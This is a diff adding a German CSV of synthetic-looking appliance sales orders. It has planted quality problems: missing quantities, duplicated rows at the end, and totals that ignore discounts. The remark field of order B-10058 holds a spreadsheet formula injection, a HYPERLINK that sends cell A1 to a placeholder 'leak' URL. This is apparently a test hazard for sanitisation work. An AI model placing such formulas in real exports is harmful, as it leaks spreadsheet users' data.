@@ -1,0 +1,248 @@
+Bestellnr;Datum;Stadt;Produkt;Menge;Einzelpreis;Gesamt;Rabatt_%;Waehrung;Bemerkung
+B-10001;18.11.2025;Berlin;Wasserkocher;k.A.;159,48;318,96 EUR;15,0;EUR;k.A.
+B-10002;02.03.2025;Zürich;Kaffeemaschine;10;216,76;2.167,60 EUR;0,0;EUR;Karton beschädigt
+B-10003;07.11.2025;Köln;Wasserkocher;2;220,79;441,58 EUR;15,0;EUR;Karton beschädigt
+B-10004;30.08.2025;Wien;Handmixer;6;470,54;2.823,24 EUR;0,0;EUR;Karton beschädigt
+B-10005;28.07.2025;Köln;Mixer;2;271,56;543,12 EUR;5,0;EUR;Karton beschädigt
+B-10006;05.09.2025;Köln;Mixer;1;408,31;408,31 EUR;15,0;EUR;
+B-10007;09.12.2025;Wien;Kaffeemaschine;7;428,65;3.000,55 EUR;15,0;EUR;k.A.
+B-10008;11.07.2025;Wien;Handmixer;7;440,79;3.085,53 EUR;15,0;EUR;
+B-10009;06.05.2025;Berlin;Handmixer;10;114,75;1.147,50 EUR;0,0;EUR;k.A.
+B-10010;26.06.2025;Berlin;Mixer;8;76,08;608,64 EUR;15,0;EUR;Karton beschädigt
+B-10011;05.08.2025;Zürich;Handmixer;k.A.;198,38;1.785,42 EUR;15,0;EUR;k.A.
+B-10012;16.07.2025;Berlin;Kaffeemaschine;7;104,39;730,73 EUR;5,0;EUR;k.A.
+B-10013;01.09.2025;München;Toaster;9;445,60;4.010,40 EUR;15,0;EUR;k.A.
+B-10014;10.11.2025;Wien;Handmixer;9;370,12;3.331,08 EUR;0,0;EUR;Karton beschädigt
+B-10015;20.04.2025;Wien;Handmixer;6;224,56;1.347,36 EUR;10,0;EUR;k.A.
+B-10016;01.11.2025;Berlin;Toaster;3;464,58;1.393,74 EUR;15,0;EUR;Karton beschädigt
+B-10017;27.09.2025;München;Mixer;2;100,65;201,30 EUR;0,0;EUR;
+B-10018;05.12.2025;Berlin;Handmixer;1;221,53;221,53 EUR;5,0;EUR;Lieferung ok
+B-10019;05.12.2025;Köln;Toaster;2;301,53;603,06 EUR;5,0;EUR;
+B-10020;20.12.2025;Wien;Wasserkocher;6;322,02;1.932,12 EUR;5,0;EUR;k.A.
+B-10021;14.11.2025;Köln;Kaffeemaschine;k.A.;70,80;708,00 EUR;15,0;EUR;Lieferung ok
+B-10022;26.12.2025;Köln;Handmixer;3;378,00;1.134,00 EUR;15,0;EUR;k.A.
+B-10023;09.06.2025;Wien;Kaffeemaschine;3;253,93;761,79 EUR;0,0;EUR;k.A.
+B-10024;25.08.2025;Köln;Kaffeemaschine;2;33,20;66,40 EUR;0,0;EUR;k.A.
+B-10025;17.10.2025;Köln;Kaffeemaschine;6;330,60;1.983,60 EUR;15,0;EUR;k.A.
+B-10026;27.05.2025;München;Handmixer;10;300,36;3.003,60 EUR;5,0;EUR;k.A.
+B-10027;28.06.2025;Berlin;Handmixer;10;167,45;1.674,50 EUR;15,0;EUR;
+B-10028;28.05.2025;Berlin;Handmixer;4;313,85;1.255,40 EUR;0,0;EUR;k.A.
+B-10029;11.03.2025;München;Handmixer;11;97,80;1.075,80 EUR;5,0;EUR;Lieferung ok
+B-10030;04.06.2025;Wien;Toaster;3;320,44;961,32 EUR;15,0;EUR;k.A.
+B-10031;04.06.2025;Köln;Wasserkocher;k.A.;189,48;378,96 EUR;10,0;EUR;k.A.
+B-10032;29.09.2025;Köln;Mixer;8;479,64;3.837,12 EUR;5,0;EUR;Karton beschädigt
+B-10033;01.05.2025;Zürich;Handmixer;9;236,05;2.124,45 EUR;10,0;EUR;
+B-10034;17.04.2025;Wien;Toaster;4;117,96;471,84 EUR;15,0;EUR;Lieferung ok
+B-10035;20.05.2025;Köln;Handmixer;1;174,77;174,77 EUR;5,0;EUR;
+B-10036;10.12.2025;Zürich;Wasserkocher;10;346,24;3.462,40 EUR;10,0;EUR;Karton beschädigt
+B-10037;21.04.2025;Köln;Kaffeemaschine;11;270,75;2.978,25 EUR;15,0;EUR;Lieferung ok
+B-10038;30.08.2025;München;Kaffeemaschine;2;331,42;662,84 EUR;10,0;EUR;Karton beschädigt
+B-10039;28.07.2025;Köln;Wasserkocher;10;403,41;4.034,10 EUR;10,0;EUR;Karton beschädigt
+B-10040;10.07.2025;Wien;Kaffeemaschine;2;15,53;31,06 EUR;0,0;EUR;
+B-10041;02.05.2025;Berlin;Handmixer;k.A.;19,82;79,28 EUR;10,0;EUR;Karton beschädigt
+B-10042;20.03.2025;Wien;Toaster;8;295,02;2.360,16 EUR;5,0;EUR;k.A.
+B-10043;01.05.2025;Köln;Handmixer;7;470,16;3.291,12 EUR;10,0;EUR;k.A.
+B-10044;30.08.2025;Berlin;Mixer;5;455,07;2.275,35 EUR;0,0;EUR;Karton beschädigt
+B-10045;02.05.2025;Köln;Mixer;12;164,69;1.976,28 EUR;10,0;EUR;
+B-10046;10.06.2025;Zürich;Kaffeemaschine;9;459,65;4.136,85 EUR;0,0;EUR;Lieferung ok
+B-10047;20.03.2025;München;Handmixer;10;66,78;667,80 EUR;10,0;EUR;Karton beschädigt
+B-10048;04.05.2025;Köln;Mixer;1;209,07;209,07 EUR;15,0;EUR;k.A.
+B-10049;21.06.2025;München;Wasserkocher;4;374,78;1.499,12 EUR;0,0;EUR;k.A.
+B-10050;25.06.2025;Berlin;Kaffeemaschine;5;379,49;1.897,45 EUR;10,0;EUR;k.A.
+B-10051;09.08.2025;München;Handmixer;k.A.;133,26;932,82 EUR;0,0;EUR;Lieferung ok
+B-10052;19.11.2025;Köln;Toaster;9;26,90;242,10 EUR;10,0;EUR;
+B-10053;03.07.2025;Wien;Kaffeemaschine;11;404,95;4.454,45 EUR;5,0;EUR;Lieferung ok
+B-10054;21.09.2025;Köln;Wasserkocher;12;435,75;5.229,00 EUR;10,0;EUR;Karton beschädigt
+B-10055;22.10.2025;Wien;Handmixer;4;185,50;742,00 EUR;15,0;EUR;Karton beschädigt
+B-10056;27.09.2025;München;Mixer;4;83,56;334,24 EUR;0,0;EUR;Karton beschädigt
+B-10057;20.03.2025;München;Kaffeemaschine;9;339,81;3.058,29 EUR;10,0;EUR;Karton beschädigt
+B-10058;10.05.2025;Berlin;Kaffeemaschine;9;353,30;3.179,70 EUR;5,0;EUR;"=HYPERLINK(""http://example.invalid/?leak=""&A1,""Details"")"
+B-10059;18.09.2025;Wien;Handmixer;10;30,03;300,30 EUR;5,0;EUR;
+B-10060;16.09.2025;Köln;Handmixer;2;75,83;151,66 EUR;10,0;EUR;Karton beschädigt
+B-10061;06.06.2025;München;Toaster;k.A.;356,28;356,28 EUR;10,0;EUR;Karton beschädigt
+B-10062;15.09.2025;München;Kaffeemaschine;6;72,12;432,72 EUR;15,0;EUR;k.A.
+B-10063;01.12.2025;München;Handmixer;6;391,51;2.349,06 EUR;0,0;EUR;Lieferung ok
+B-10064;23.05.2025;Berlin;Kaffeemaschine;6;262,91;1.577,46 EUR;0,0;EUR;Karton beschädigt
+B-10065;19.06.2025;Zürich;Wasserkocher;2;182,33;364,66 EUR;5,0;EUR;Lieferung ok
+B-10066;04.11.2025;Berlin;Kaffeemaschine;2;472,95;945,90 EUR;15,0;EUR;Karton beschädigt
+B-10067;30.04.2025;Köln;Mixer;10;151,00;1.510,00 EUR;15,0;EUR;
+B-10068;31.08.2025;Wien;Handmixer;9;253,42;2.280,78 EUR;10,0;EUR;
+B-10069;14.04.2025;Wien;Toaster;2;375,93;751,86 EUR;10,0;EUR;Lieferung ok
+B-10070;15.11.2025;Zürich;Toaster;3;162,08;486,24 EUR;10,0;EUR;k.A.
+B-10071;09.06.2025;Wien;Wasserkocher;k.A.;156,74;1.097,18 EUR;10,0;EUR;Karton beschädigt
+B-10072;12.09.2025;München;Wasserkocher;7;400,69;2.804,83 EUR;15,0;EUR;Lieferung ok
+B-10073;30.04.2025;Köln;Toaster;7;135,05;945,35 EUR;15,0;EUR;Karton beschädigt
+B-10074;16.07.2025;München;Toaster;3;265,75;797,25 EUR;5,0;EUR;
+B-10075;21.10.2025;Wien;Mixer;5;147,22;736,10 EUR;0,0;EUR;Karton beschädigt
+B-10076;18.04.2025;Wien;Handmixer;11;201,95;2.221,45 EUR;5,0;EUR;k.A.
+B-10077;31.03.2025;Wien;Wasserkocher;6;314,31;1.885,86 EUR;0,0;EUR;Karton beschädigt
+B-10078;06.05.2025;Köln;Handmixer;9;339,50;3.055,50 EUR;15,0;EUR;k.A.
+B-10079;20.03.2025;München;Kaffeemaschine;8;168,55;1.348,40 EUR;10,0;EUR;Karton beschädigt
+B-10080;21.10.2025;Zürich;Toaster;1;376,27;376,27 EUR;10,0;EUR;
+B-10081;01.12.2025;Berlin;Kaffeemaschine;9;335,14;3.016,26 EUR;5,0;EUR;Karton beschädigt
+B-10082;14.06.2025;Zürich;Wasserkocher;4;453,19;1.812,76 EUR;10,0;EUR;
+B-10083;23.11.2025;Zürich;Handmixer;10;205,43;2.054,30 EUR;5,0;EUR;
+B-10084;01.10.2025;Berlin;Wasserkocher;1;136,58;136,58 EUR;5,0;EUR;k.A.
+B-10085;23.08.2025;Köln;Toaster;11;321,30;3.534,30 EUR;15,0;EUR;Karton beschädigt
+B-10086;07.07.2025;Berlin;Mixer;8;425,02;3.400,16 EUR;5,0;EUR;
+B-10087;08.07.2025;Wien;Wasserkocher;8;390,02;3.120,16 EUR;10,0;EUR;Karton beschädigt
+B-10088;21.09.2025;Köln;Wasserkocher;9;405,70;3.651,30 EUR;0,0;EUR;k.A.
+B-10089;16.11.2025;Zürich;Toaster;2;350,89;701,78 EUR;15,0;EUR;
+B-10090;14.08.2025;Wien;Toaster;9;467,97;4.211,73 EUR;10,0;EUR;Karton beschädigt
+B-10091;13.12.2025;München;Toaster;3;45,77;137,31 EUR;15,0;EUR;
+B-10092;15.03.2025;Wien;Wasserkocher;10;470,37;4.703,70 EUR;5,0;EUR;k.A.
+B-10093;04.05.2025;Zürich;Wasserkocher;9;411,93;3.707,37 EUR;10,0;EUR;k.A.
+B-10094;14.08.2025;Köln;Mixer;3;272,24;816,72 EUR;5,0;EUR;Lieferung ok
+B-10095;18.05.2025;München;Wasserkocher;10;268,67;2.686,70 EUR;0,0;EUR;
+B-10096;31.05.2025;München;Toaster;5;380,86;1.904,30 EUR;10,0;EUR;Lieferung ok
+B-10097;28.03.2025;München;Wasserkocher;8;88,27;706,16 EUR;15,0;EUR;k.A.
+B-10098;01.08.2025;München;Handmixer;9;459,96;4.139,64 EUR;10,0;EUR;
+B-10099;25.09.2025;München;Toaster;8;329,47;2.635,76 EUR;5,0;EUR;
+B-10100;18.04.2025;Köln;Handmixer;8;12,56;100,48 EUR;10,0;EUR;Karton beschädigt
+B-10101;06.06.2025;Berlin;Mixer;1;86,15;86,15 EUR;15,0;EUR;Lieferung ok
+B-10102;09.11.2025;München;Toaster;3;122,57;367,71 EUR;5,0;EUR;k.A.
+B-10103;02.09.2025;München;Toaster;12;208,32;2.499,84 EUR;15,0;EUR;k.A.
+B-10104;17.06.2025;München;Kaffeemaschine;2;422,87;845,74 EUR;0,0;EUR;Karton beschädigt
+B-10105;20.05.2025;Berlin;Wasserkocher;12;328,82;3.945,84 EUR;5,0;EUR;k.A.
+B-10106;06.10.2025;Berlin;Handmixer;4;432,66;1.730,64 EUR;5,0;EUR;Karton beschädigt
+B-10107;20.09.2025;Berlin;Mixer;5;357,13;1.785,65 EUR;15,0;EUR;Karton beschädigt
+B-10108;10.05.2025;Berlin;Wasserkocher;6;238,93;1.433,58 EUR;5,0;EUR;Karton beschädigt
+B-10109;25.03.2025;Zürich;Toaster;8;186,76;1.494,08 EUR;10,0;EUR;
+B-10110;05.12.2025;Zürich;Handmixer;8;229,69;1.837,52 EUR;0,0;EUR;Karton beschädigt
+B-10111;22.03.2025;Berlin;Handmixer;5;26,54;132,70 EUR;15,0;EUR;
+B-10112;20.12.2025;Wien;Handmixer;7;385,39;2.697,73 EUR;15,0;EUR;
+B-10113;08.05.2025;Berlin;Kaffeemaschine;3;432,04;1.296,12 EUR;15,0;EUR;
+B-10114;09.07.2025;Berlin;Kaffeemaschine;3;260,88;782,64 EUR;0,0;EUR;
+B-10115;19.08.2025;München;Toaster;12;462,99;5.555,88 EUR;15,0;EUR;Lieferung ok
+B-10116;26.10.2025;München;Mixer;6;346,69;2.080,14 EUR;5,0;EUR;Karton beschädigt
+B-10117;06.07.2025;Zürich;Wasserkocher;7;28,44;199,08 EUR;15,0;EUR;Lieferung ok
+B-10118;12.09.2025;Wien;Handmixer;2;286,12;572,24 EUR;0,0;EUR;k.A.
+B-10119;18.03.2025;Zürich;Mixer;4;190,20;760,80 EUR;5,0;EUR;Karton beschädigt
+B-10120;08.08.2025;Köln;Mixer;4;414,33;1.657,32 EUR;0,0;EUR;Karton beschädigt
+B-10121;25.05.2025;Zürich;Kaffeemaschine;10;418,54;4.185,40 EUR;10,0;EUR;Lieferung ok
+B-10122;27.05.2025;Wien;Mixer;10;44,79;447,90 EUR;0,0;EUR;
+B-10123;03.03.2025;München;Wasserkocher;7;197,83;1.384,81 EUR;0,0;EUR;Karton beschädigt
+B-10124;08.09.2025;Berlin;Toaster;3;256,14;768,42 EUR;5,0;EUR;
+B-10125;13.12.2025;Berlin;Mixer;4;341,83;1.367,32 EUR;0,0;EUR;Karton beschädigt
+B-10126;19.11.2025;Berlin;Wasserkocher;12;228,95;2.747,40 EUR;15,0;EUR;
+B-10127;03.04.2025;Köln;Wasserkocher;5;51,90;259,50 EUR;0,0;EUR;Karton beschädigt
+B-10128;28.10.2025;Köln;Kaffeemaschine;10;313,43;3.134,30 EUR;5,0;EUR;Lieferung ok
+B-10129;03.12.2025;Köln;Wasserkocher;8;395,32;3.162,56 EUR;15,0;EUR;k.A.
+B-10130;08.03.2025;Wien;Mixer;2;123,12;246,24 EUR;0,0;EUR;k.A.
+B-10131;27.05.2025;München;Wasserkocher;11;302,21;3.324,31 EUR;5,0;EUR;Karton beschädigt
+B-10132;26.05.2025;Wien;Kaffeemaschine;7;140,38;982,66 EUR;0,0;EUR;Karton beschädigt
+B-10133;06.05.2025;Zürich;Handmixer;2;361,23;722,46 EUR;5,0;EUR;k.A.
+B-10134;13.08.2025;München;Mixer;12;79,17;950,04 EUR;0,0;EUR;Lieferung ok
+B-10135;15.04.2025;Wien;Mixer;1;392,59;392,59 EUR;10,0;EUR;Karton beschädigt
+B-10136;11.03.2025;Köln;Wasserkocher;2;358,76;717,52 EUR;0,0;EUR;k.A.
+B-10137;21.12.2025;Zürich;Wasserkocher;4;453,33;1.813,32 EUR;10,0;EUR;
+B-10138;29.05.2025;Wien;Handmixer;1;170,34;170,34 EUR;0,0;EUR;Lieferung ok
+B-10139;21.05.2025;Zürich;Handmixer;11;231,06;2.541,66 EUR;15,0;EUR;
+B-10140;26.11.2025;Köln;Wasserkocher;2;68,90;137,80 EUR;15,0;EUR;Karton beschädigt
+B-10141;30.07.2025;München;Mixer;1;218,27;218,27 EUR;0,0;EUR;k.A.
+B-10142;25.06.2025;Köln;Mixer;10;66,22;662,20 EUR;0,0;EUR;k.A.
+B-10143;14.10.2025;Köln;Toaster;5;215,66;1.078,30 EUR;15,0;EUR;k.A.
+B-10144;08.08.2025;München;Kaffeemaschine;8;148,63;1.189,04 EUR;0,0;EUR;Lieferung ok
+B-10145;29.07.2025;Wien;Wasserkocher;4;474,78;1.899,12 EUR;10,0;EUR;Lieferung ok
+B-10146;05.05.2025;Zürich;Toaster;2;117,26;234,52 EUR;15,0;EUR;Lieferung ok
+B-10147;03.12.2025;Zürich;Mixer;10;267,62;2.676,20 EUR;10,0;EUR;Karton beschädigt
+B-10148;16.11.2025;Köln;Kaffeemaschine;8;123,25;986,00 EUR;5,0;EUR;Karton beschädigt
+B-10149;23.12.2025;München;Mixer;3;408,28;1.224,84 EUR;15,0;EUR;k.A.
+B-10150;05.08.2025;Berlin;Handmixer;11;36,87;405,57 EUR;10,0;EUR;Karton beschädigt
+B-10151;29.11.2025;Zürich;Toaster;7;115,37;807,59 EUR;10,0;EUR;Karton beschädigt
+B-10152;07.03.2025;Wien;Handmixer;7;256,63;1.796,41 EUR;15,0;EUR;k.A.
+B-10153;03.09.2025;München;Handmixer;10;429,26;4.292,60 EUR;15,0;EUR;Karton beschädigt
+B-10154;15.03.2025;Berlin;Wasserkocher;12;416,43;4.997,16 EUR;5,0;EUR;Lieferung ok
+B-10155;29.10.2025;München;Mixer;8;299,97;2.399,76 EUR;5,0;EUR;Karton beschädigt
+B-10156;21.04.2025;Berlin;Wasserkocher;1;265,86;265,86 EUR;15,0;EUR;
+B-10157;20.11.2025;Berlin;Mixer;8;292,30;2.338,40 EUR;5,0;EUR;Karton beschädigt
+B-10158;19.04.2025;Berlin;Toaster;5;431,71;2.158,55 EUR;5,0;EUR;k.A.
+B-10159;24.04.2025;München;Handmixer;11;203,93;2.243,23 EUR;15,0;EUR;Karton beschädigt
+B-10160;14.04.2025;Köln;Wasserkocher;10;94,31;943,10 EUR;5,0;EUR;k.A.
+B-10161;20.04.2025;Zürich;Mixer;8;456,69;3.653,52 EUR;5,0;EUR;
+B-10162;03.10.2025;Berlin;Mixer;1;331,99;331,99 EUR;15,0;EUR;
+B-10163;20.04.2025;Berlin;Mixer;8;233,00;1.864,00 EUR;5,0;EUR;k.A.
+B-10164;05.12.2025;Zürich;Wasserkocher;11;41,35;454,85 EUR;15,0;EUR;
+B-10165;06.03.2025;München;Handmixer;6;457,01;2.742,06 EUR;10,0;EUR;Karton beschädigt
+B-10166;24.06.2025;Köln;Kaffeemaschine;7;379,16;2.654,12 EUR;15,0;EUR;
+B-10167;14.07.2025;Köln;Mixer;10;370,88;3.708,80 EUR;10,0;EUR;Lieferung ok
+B-10168;24.11.2025;München;Handmixer;12;397,48;4.769,76 EUR;15,0;EUR;Karton beschädigt
+B-10169;07.07.2025;Zürich;Mixer;1;270,65;270,65 EUR;10,0;EUR;k.A.
+B-10170;12.07.2025;München;Handmixer;12;410,43;4.925,16 EUR;15,0;EUR;Lieferung ok
+B-10171;06.08.2025;Köln;Toaster;6;392,76;2.356,56 EUR;0,0;EUR;Lieferung ok
+B-10172;20.08.2025;Köln;Kaffeemaschine;1;441,19;441,19 EUR;10,0;EUR;k.A.
+B-10173;23.10.2025;Zürich;Mixer;11;208,85;2.297,35 EUR;0,0;EUR;Karton beschädigt
+B-10174;18.10.2025;Zürich;Toaster;7;364,92;2.554,44 EUR;15,0;EUR;Karton beschädigt
+B-10175;14.09.2025;Köln;Toaster;1;367,26;367,26 EUR;15,0;EUR;
+B-10176;23.03.2025;Zürich;Kaffeemaschine;6;203,69;1.222,14 EUR;10,0;EUR;
+B-10177;08.10.2025;Köln;Mixer;2;371,50;743,00 EUR;10,0;EUR;Karton beschädigt
+B-10178;30.03.2025;Berlin;Wasserkocher;1;106,14;106,14 EUR;5,0;EUR;
+B-10179;02.12.2025;Wien;Kaffeemaschine;12;181,91;2.182,92 EUR;0,0;EUR;Karton beschädigt
+B-10180;01.10.2025;München;Kaffeemaschine;3;59,91;179,73 EUR;0,0;EUR;
+B-10181;15.09.2025;Berlin;Wasserkocher;2;479,47;958,94 EUR;15,0;EUR;
+B-10182;06.09.2025;Zürich;Mixer;5;201,62;1.008,10 EUR;5,0;EUR;
+B-10183;15.07.2025;Zürich;Wasserkocher;7;155,78;1.090,46 EUR;15,0;EUR;
+B-10184;19.12.2025;Wien;Mixer;2;222,55;445,10 EUR;15,0;EUR;Lieferung ok
+B-10185;18.04.2025;München;Mixer;1;144,38;144,38 EUR;5,0;EUR;Karton beschädigt
+B-10186;17.05.2025;München;Toaster;12;226,60;2.719,20 EUR;5,0;EUR;Karton beschädigt
+B-10187;07.06.2025;Wien;Mixer;1;426,56;426,56 EUR;0,0;EUR;Karton beschädigt
+B-10188;06.03.2025;Köln;Handmixer;7;464,53;3.251,71 EUR;0,0;EUR;Karton beschädigt
+B-10189;22.08.2025;Köln;Kaffeemaschine;9;112,08;1.008,72 EUR;10,0;EUR;
+B-10190;24.06.2025;Wien;Handmixer;9;43,46;391,14 EUR;10,0;EUR;Lieferung ok
+B-10191;08.12.2025;Köln;Kaffeemaschine;3;79,49;238,47 EUR;15,0;EUR;Karton beschädigt
+B-10192;02.09.2025;München;Wasserkocher;10;313,61;3.136,10 EUR;5,0;EUR;Karton beschädigt
+B-10193;09.05.2025;Zürich;Toaster;8;39,42;315,36 EUR;0,0;EUR;Karton beschädigt
+B-10194;29.10.2025;Berlin;Toaster;4;347,55;1.390,20 EUR;5,0;EUR;Karton beschädigt
+B-10195;22.04.2025;München;Toaster;8;193,91;1.551,28 EUR;0,0;EUR;Karton beschädigt
+B-10196;06.04.2025;Wien;Toaster;11;396,21;4.358,31 EUR;10,0;EUR;Karton beschädigt
+B-10197;25.03.2025;Berlin;Toaster;3;466,53;1.399,59 EUR;15,0;EUR;
+B-10198;02.12.2025;Berlin;Kaffeemaschine;4;317,11;1.268,44 EUR;10,0;EUR;Lieferung ok
+B-10199;11.08.2025;Berlin;Toaster;1;303,89;303,89 EUR;15,0;EUR;k.A.
+B-10200;21.06.2025;Berlin;Toaster;11;166,48;1.831,28 EUR;15,0;EUR;k.A.
+B-10201;23.08.2025;Köln;Wasserkocher;12;211,04;2.532,48 EUR;10,0;EUR;Karton beschädigt
+B-10202;11.04.2025;Berlin;Mixer;7;262,07;1.834,49 EUR;15,0;EUR;
+B-10203;28.10.2025;München;Mixer;11;290,85;3.199,35 EUR;15,0;EUR;
+B-10204;30.08.2025;Berlin;Toaster;12;440,15;5.281,80 EUR;0,0;EUR;Lieferung ok
+B-10205;15.06.2025;Köln;Wasserkocher;7;115,24;806,68 EUR;15,0;EUR;
+B-10206;26.11.2025;Wien;Toaster;2;27,09;54,18 EUR;5,0;EUR;k.A.
+B-10207;10.06.2025;Zürich;Toaster;11;71,30;784,30 EUR;5,0;EUR;Karton beschädigt
+B-10208;10.10.2025;Zürich;Mixer;7;143,78;1.006,46 EUR;5,0;EUR;
+B-10209;05.09.2025;München;Handmixer;7;186,05;1.302,35 EUR;15,0;EUR;Karton beschädigt
+B-10210;01.07.2025;Köln;Handmixer;6;469,84;2.819,04 EUR;0,0;EUR;Lieferung ok
+B-10211;10.04.2025;Wien;Wasserkocher;12;135,22;1.622,64 EUR;5,0;EUR;Lieferung ok
+B-10212;25.10.2025;Wien;Kaffeemaschine;5;302,08;1.510,40 EUR;10,0;EUR;Karton beschädigt
+B-10213;24.03.2025;Köln;Mixer;12;52,23;626,76 EUR;10,0;EUR;
+B-10214;17.11.2025;Wien;Toaster;7;427,62;2.993,34 EUR;15,0;EUR;
+B-10215;22.07.2025;Berlin;Kaffeemaschine;2;338,23;676,46 EUR;5,0;EUR;Lieferung ok
+B-10216;10.08.2025;München;Toaster;6;390,46;2.342,76 EUR;10,0;EUR;
+B-10217;27.05.2025;Zürich;Toaster;11;142,44;1.566,84 EUR;15,0;EUR;Karton beschädigt
+B-10218;08.04.2025;Zürich;Wasserkocher;8;472,42;3.779,36 EUR;10,0;EUR;Karton beschädigt
+B-10219;17.09.2025;Berlin;Handmixer;7;12,72;89,04 EUR;10,0;EUR;k.A.
+B-10220;12.12.2025;Berlin;Kaffeemaschine;9;334,09;3.006,81 EUR;0,0;EUR;
+B-10221;08.08.2025;München;Kaffeemaschine;12;29,22;350,64 EUR;0,0;EUR;k.A.
+B-10222;25.04.2025;Wien;Kaffeemaschine;1;371,37;371,37 EUR;5,0;EUR;Lieferung ok
+B-10223;21.06.2025;Berlin;Toaster;8;103,59;828,72 EUR;15,0;EUR;
+B-10224;24.11.2025;Zürich;Mixer;4;26,05;104,20 EUR;15,0;EUR;
+B-10225;21.09.2025;Berlin;Kaffeemaschine;7;464,16;3.249,12 EUR;10,0;EUR;k.A.
+B-10226;11.04.2025;Berlin;Wasserkocher;4;176,43;705,72 EUR;0,0;EUR;Lieferung ok
+B-10227;20.03.2025;Berlin;Toaster;9;122,17;1.099,53 EUR;0,0;EUR;Lieferung ok
+B-10228;06.08.2025;München;Mixer;1;456,35;456,35 EUR;5,0;EUR;k.A.
+B-10229;08.11.2025;Berlin;Toaster;2;421,49;842,98 EUR;10,0;EUR;Lieferung ok
+B-10230;23.03.2025;Berlin;Wasserkocher;10;124,31;1.243,10 EUR;15,0;EUR;k.A.
+B-10231;17.04.2025;München;Handmixer;1;249,77;249,77 EUR;15,0;EUR;k.A.
+B-10232;11.11.2025;Zürich;Wasserkocher;1;416,65;416,65 EUR;5,0;EUR;Lieferung ok
+B-10233;04.04.2025;München;Wasserkocher;10;408,50;4.085,00 EUR;15,0;EUR;
+B-10234;21.04.2025;Zürich;Mixer;3;475,25;1.425,75 EUR;0,0;EUR;Karton beschädigt
+B-10235;09.05.2025;Zürich;Handmixer;9;420,85;3.787,65 EUR;0,0;EUR;Karton beschädigt
+B-10236;23.09.2025;Wien;Toaster;8;444,71;3.557,68 EUR;10,0;EUR;Karton beschädigt
+B-10237;29.03.2025;Wien;Mixer;9;434,82;3.913,38 EUR;5,0;EUR;Karton beschädigt
+B-10238;29.09.2025;Zürich;Wasserkocher;2;194,89;389,78 EUR;10,0;EUR;k.A.
+B-10239;16.04.2025;München;Toaster;4;129,01;516,04 EUR;0,0;EUR;k.A.
+B-10240;22.05.2025;Wien;Toaster;11;475,46;5.230,06 EUR;5,0;EUR;k.A.
+B-10207;10.06.2025;Zürich;Toaster;11;71,30;784,30 EUR;5,0;EUR;Karton beschädigt
+B-10039;28.07.2025;Köln;Wasserkocher;10;403,41;4.034,10 EUR;10,0;EUR;Karton beschädigt
+B-10133;06.05.2025;Zürich;Handmixer;2;361,23;722,46 EUR;5,0;EUR;k.A.
+B-10208;10.10.2025;Zürich;Mixer;7;143,78;1.006,46 EUR;5,0;EUR;
+B-10044;30.08.2025;Berlin;Mixer;5;455,07;2.275,35 EUR;0,0;EUR;Karton beschädigt
+B-10147;03.12.2025;Zürich;Mixer;10;267,62;2.676,20 EUR;10,0;EUR;Karton beschädigt
+B-10007;09.12.2025;Wien;Kaffeemaschine;7;428,65;3.000,55 EUR;15,0;EUR;k.A.
